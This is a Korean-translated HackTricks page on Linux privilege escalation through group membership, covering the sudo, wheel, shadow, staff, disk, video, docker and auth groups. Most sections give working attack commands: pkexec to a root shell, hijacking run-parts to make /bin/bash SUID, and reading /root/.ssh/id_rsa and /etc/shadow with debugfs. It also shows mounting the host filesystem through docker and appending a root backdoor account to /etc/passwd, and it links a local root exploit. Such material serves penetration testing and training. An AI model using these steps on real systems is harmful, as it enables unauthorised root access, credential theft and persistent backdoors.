# 흥미로운 그룹 - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/관리자 그룹

### **PE - Method 1**

**가끔**, **기본적으로(또는 어떤 소프트웨어가 필요로 해서)** **/etc/sudoers** 파일 안에 다음과 같은 줄들을 찾을 수 있습니다:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
이는 **sudo 또는 admin 그룹에 속한 모든 사용자가 sudo로 무엇이든 실행할 수 있다**는 뜻이다.

만약 이런 경우라면, **root가 되기 위해서는 다음을 실행하면 된다**:
```
sudo su
```
### PE - Method 2

모든 suid 바이너리를 찾아 **Pkexec** 바이너리가 있는지 확인하세요:
```bash
find / -perm -4000 2>/dev/null
```
만약 바이너리 **pkexec is a SUID binary**를 발견하고 당신이 **sudo** 또는 **admin**에 속한다면, `pkexec`를 사용하여 아마도 sudo 권한으로 바이너리를 실행할 수 있습니다.\
이는 일반적으로 해당 그룹들이 **polkit policy**에 포함되어 있기 때문입니다. 이 정책은 기본적으로 어떤 그룹들이 `pkexec`를 사용할 수 있는지를 식별합니다. 다음으로 확인하세요:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
거기에서 어떤 그룹이 **pkexec**를 실행할 수 있는지 확인할 수 있습니다. 일부 linux 배포판에서는 **기본적으로** **sudo** 및 **admin** 그룹이 나타납니다.

**root가 되기 위해 실행할 수 있는**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
만약 **pkexec**를 실행하려고 시도했을 때 다음과 같은 **오류**가 발생한다면:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**권한이 없어서가 아니라 GUI로 연결되어 있지 않기 때문입니다**. 그리고 이 문제에 대한 우회 방법은 여기에서 확인할 수 있습니다: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2개의 서로 다른 ssh 세션**이 필요합니다:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel 그룹

**때때로**, **기본적으로** **/etc/sudoers** 파일 안에서 다음 줄을 찾을 수 있습니다:
```
%wheel	ALL=(ALL:ALL) ALL
```
이는 **wheel 그룹에 속한 모든 사용자가 sudo로 무엇이든 실행할 수 있다는 뜻입니다**.

이 경우, **root가 되려면 단순히 다음을 실행하면 됩니다**:
```
sudo su
```
## Shadow 그룹

사용자는 **group shadow**에 속해 있으면 **/etc/shadow** 파일을 **읽을 수 있습니다**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
파일을 읽고 **crack some hashes** 해보세요.

triaging hashes 시 잠금 상태에 대한 간단한 유의점:
- `!` 또는 `*` 가 있는 항목은 일반적으로 비밀번호 로그인을 위한 상호작용이 불가능합니다.
- `!hash`는 일반적으로 비밀번호가 설정된 후 잠금 처리되었음을 의미합니다.
- `*`는 일반적으로 유효한 비밀번호 해시가 한 번도 설정되지 않았음을 의미합니다.
직접 로그인이 차단된 경우에도 계정 분류에 유용합니다.

## Staff Group

**staff**: 사용자가 root 권한 없이 시스템의 로컬 수정을 추가할 수 있게 해줍니다 (`/usr/local`) (참고로 `/usr/local/bin`에 있는 실행 파일은 모든 사용자의 $PATH 변수에 포함되며, 같은 이름의 `/bin` 및 `/usr/bin`에 있는 실행 파일을 "override"할 수 있습니다). 모니터링/보안과 더 관련이 있는 그룹 "adm"과 비교하세요. [\[source\]](https://wiki.debian.org/SystemGroups)

debian 배포판에서는 `$PATH` 변수에 따라 `/usr/local/`가 가장 높은 우선순위로 실행되며, 권한 있는 사용자 여부와 관계없이 적용됩니다.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
`/usr/local`에 있는 일부 프로그램을 hijack할 수 있다면 root를 쉽게 얻을 수 있다.

`run-parts` 프로그램을 hijack하는 것은 root를 쉽게 얻는 방법이다. 대부분의 프로그램이 `run-parts` 같은 것을 실행하기 때문이다 (예: crontab, ssh 로그인 시).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
또는 새 ssh 세션이 로그인할 때.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## 디스크 그룹

이 권한은 머신 내부의 모든 데이터에 접근할 수 있으므로 거의 **equivalent to root access**입니다.

파일:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
하지만, 만약 당신이 **root가 소유한 파일을 쓰려고** 하면 (예: `/etc/shadow` 또는 `/etc/passwd`) 당신은 "**Permission denied**" 오류가 발생합니다.

## Video Group

`w` 명령을 사용하면 시스템에 **누가 로그인해 있는지** 확인할 수 있으며 다음과 같은 출력이 표시됩니다:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**은 사용자 **yossi가 물리적으로 로그인되어 있음**을 의미하며, 이는 해당 사용자가 머신의 터미널에 직접 연결되어 있음을 뜻합니다.

The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
To **열기** the **raw image** you can use **GIMP**, select the **`screen.raw`** file and select as file type **Raw image data**:

![](<../../../images/image (463).png>)

Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):

![](<../../../images/image (317).png>)

## Root Group

It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...

**어떤 파일을 root members가 modify할 수 있는지 확인하세요**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

당신은 **mount the root filesystem of the host machine to an instance’s volume** 할 수 있으며, 인스턴스가 시작될 때 즉시 해당 볼륨에 `chroot`를 로드합니다. 이는 사실상 machine의 root 권한을 제공합니다.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:


{{#ref}}
../container-security/
{{#endref}}

If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd 그룹


{{#ref}}
./
{{#endref}}

## Adm 그룹

보통 이 그룹의 **members**는 _/var/log/_에 위치한 로그 파일을 **read**할 수 있는 권한을 가지고 있습니다.\
따라서 이 그룹에 속한 사용자를 권한 상승하여 탈취했다면 반드시 **logs**를 확인하세요.

## Backup / Operator / lp / Mail 그룹

이 그룹들은 직접적인 root 벡터라기보다는 종종 **credential-discovery** 벡터로 작용합니다:
- **backup**: configs, keys, DB dumps 또는 tokens이 포함된 아카이브를 노출할 수 있습니다.
- **operator**: platform-specific operational access로 민감한 런타임 데이터를 leak할 수 있습니다.
- **lp**: print queues/spools에 문서 내용이 포함될 수 있습니다.
- **mail**: mail spools는 리셋 링크, OTPs, 및 internal credentials를 노출할 수 있습니다.

여기 멤버십은 고가치 데이터 노출 발견으로 간주하고 password/token reuse를 통해 피벗하세요.

## Auth 그룹

OpenBSD에서는 **auth** 그룹이 해당 폴더들 _**/etc/skey**_ 및 _**/var/db/yubikey**_ 에 쓰기 권한을 가지는 경우가 많습니다.\
이 권한들은 다음 익스플로잇으로 남용되어 root로 **escalate privileges** 할 수 있습니다: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
